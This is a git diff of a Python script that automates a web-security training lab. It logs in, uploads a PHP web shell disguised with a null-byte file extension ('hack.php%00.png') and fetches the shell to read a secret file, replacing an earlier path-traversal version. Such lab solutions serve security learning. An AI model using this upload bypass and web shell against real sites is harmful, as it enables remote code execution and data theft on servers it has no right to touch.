@@ -2,17 +2,17 @@
 #
 # Author: Ahmed Elqalawy (@elqal3awii)
 #
-# Date: 12/10/2023
+# Date: 13/10/2023
 #
-# Lab: Web shell upload via path traversal
+# Lab: Web shell upload via obfuscated file extension
 #
 # Steps: 1. Fetch login page
 #        2. Extract csrf token and session cookie
 #        3. Login as wiener
 #        4. Fetch wiener profile
-#        5. Upload the shell file via path traversal
+#        5. Upload the shell file via obfuscated file extension
 #        6. Fetch the uploaded shell file to read the secret
-#        7. Submit the solution
+#        7. Submit solution
 #
 ###################################################################
 
@@ -30,7 +30,7 @@ from colorama import Fore
 ###########
 
 # change this to your lab URL
-url = "https://0a690019043981aa8bdbca8500e800b0.web-security-academy.net"
+url = "https://0a3f0039043698f381fac10400b20013.web-security-academy.net"
 
 try:  
     # fetch login page
@@ -102,9 +102,8 @@ shell_file = """<?php echo file_get_contents("/home/carlos/secret") ?>"""
 shell_file_name = "hack.php"
 
 # set the avatar
-# %2e%2e%2f = ../
 files = {
-    "avatar": (f"%2e%2e%2f{shell_file_name}", shell_file, "application/x-php")
+    "avatar": (f"{shell_file_name}%00.png", shell_file, "application/x-php")
 }
 
 # set the other data to send with the avatar
@@ -121,11 +120,11 @@ except:
     print(Fore.RED + "[!] Failed to upload the shell file through exception")
     exit(1)
 
-print(Fore.WHITE + "⦗5⦘ Uploading the shell file via path traversal.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗5⦘ Uploading the shell file via obfuscated file extension.. " + Fore.GREEN + "OK")
 
 try:
     # fetch the uploaded shell file
-    uploaded_shell = requests.get(f"{url}/files/{shell_file_name}", cookies=cookies)
+    uploaded_shell = requests.get(f"{url}/files/avatars/{shell_file_name}", cookies=cookies)
     
 except:
     print(Fore.RED + "[!] Failed to fetch the uploaded shell file through exception")
